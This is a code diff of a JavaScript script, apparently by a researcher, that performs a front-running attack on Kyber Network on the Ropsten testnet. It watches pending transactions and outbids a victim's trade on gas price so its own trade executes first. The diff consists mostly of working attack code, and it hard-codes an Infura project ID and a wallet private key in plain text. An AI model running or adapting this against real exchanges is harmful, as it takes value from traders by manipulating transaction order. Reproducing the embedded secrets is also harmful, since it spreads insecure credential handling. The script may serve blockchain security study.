@@ -1,11 +1,16 @@
-// https://developer.kyber.network/docs/Integrations-Web3Guide/
+/**
+ * Perform a front-running attack on Kyber Network (ropsten)
+ * @author Jiaying Yao
+ */
 
 var Web3 = require('web3');
 var fetch = require('node-fetch');
 var Tx = require('ethereumjs-tx').Transaction;
 
-const web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io"));
-const NETWORK_URL = "https://ropsten-api.kyber.network";
+const NETWORK = "ropsten";
+const PROJECT_ID = "5d664eb0e357434389de19c203e530c1";
+const web3 = new Web3(new Web3.providers.HttpProvider(`https://${NETWORK}.infura.io/v3/${PROJECT_ID}`));
+const NETWORK_URL = `https://${NETWORK}-api.kyber.network`;
 
 // KyberNetworkProxy
 const KYBER_NETWORK_PROXY = '0x818E6FECD516Ecc3849DAf6845e3EC868087B755';
@@ -18,7 +23,7 @@ const KNC_TOKEN_ADDRESS = '0x4E470dc7321E84CA96FcAEDD0C8aBCebbAEB68C6';
 const TRADE_WITH_HINT = '0x29589f61';
 const TRADE = '0xcb3c28c7';
 // wallet address for fee sharing program
-const REF_ADDRESS = "0x0000000000000000000000000000000000000000"
+const WALLET_ID = "0x0000000000000000000000000000000000000000"
 const ETH_DECIMALS = 18;
 const KNC_DECIMALS = 18;
 // How many KNC you want to buy
@@ -38,29 +43,23 @@ const MAX_GAS_PRICE = 50000000000;
 const USER_ACCOUNT = '0xd0ee49F0B17144CF7D046c4EF442003D89b84e50';
 // Your private key
 const PRIVATE_KEY = Buffer.from('F06AC31EC8660085CA78727B72B8EE6C39281614315F772CCA2BF18919750D93', 'hex');
-
 // if the front run has succeed
 var succeed = false;
 
+var subscription;
+
 async function main() {
     // get pending transactions
-    const web3Ws = new Web3(new Web3.providers.WebsocketProvider("wss://ropsten.infura.io/ws"));
-    var subscription = await web3Ws.eth.subscribe('pendingTransactions', async function (error, result) {
+    const web3Ws = new Web3(new Web3.providers.WebsocketProvider(`wss://${NETWORK}.infura.io/ws/v3/${PROJECT_ID}`));
+    subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
     }).on("data", async function (transactionHash) {
         let transaction = await web3.eth.getTransaction(transactionHash);
         await handleTransaction(transaction);
+        
         if (succeed) {
             console.log("Front-running attack succeed.");
-            return
+            process.exit();
         }
-        /* web3.eth.getTransaction(transactionHash)
-            .then(async function (transaction) {
-                await handleTransaction(transaction);
-                if (succeed) {
-                    console.log("Front-running attack succeed.");
-                    return
-                }
-            }); */
     })
 }
 
@@ -75,12 +74,15 @@ async function handleTransaction(transaction) {
     if (newGasPrice > MAX_GAS_PRICE) {
         newGasPrice = MAX_GAS_PRICE;
     }
-    console.log(newGasPrice, transaction);
+    
     if (triggersFrontRun(transaction)) {
+        subscription.unsubscribe();
         console.log('Perform front running attack...');
         await performTrade(ETH_QTY, newGasPrice);
         // wait until the honest transaction is done
-        while (await isPending(transaction['hash'])) { }
+        while (await isPending(transaction['hash'])) {
+            console.log("wait until the honest transaction is done");
+        }
         succeed = true;
     }
 }
@@ -120,12 +122,7 @@ async function performTrade(srcAmount, gasPrice) {
         // WALLET_ID
     );
     let tradeDetails = await tradeDetailsRequest.json();
-    // console.log(tradeDetails);
     // Extract the raw transaction details
-    /*if (!(tradeDetails && tradeDetails.length)) {
-        console.log("error");
-        return
-    }*/
     let rawTx = tradeDetails.data[0];
     rawTx['gasPrice'] = '0x' + gasPrice.toString(16);
     console.log("Planning to send: ", rawTx);
@@ -151,7 +148,7 @@ async function getQuoteAmount(srcToken, destToken, srcQty) {
 }
 
 async function isPending(transactionHash) {
-    return await web3.eth.getTransaction(transactionHash)['blockHash'] == null
+    return await web3.eth.getTransactionReceipt(transactionHash) == null;
 }
 
 function parseTx(input) {
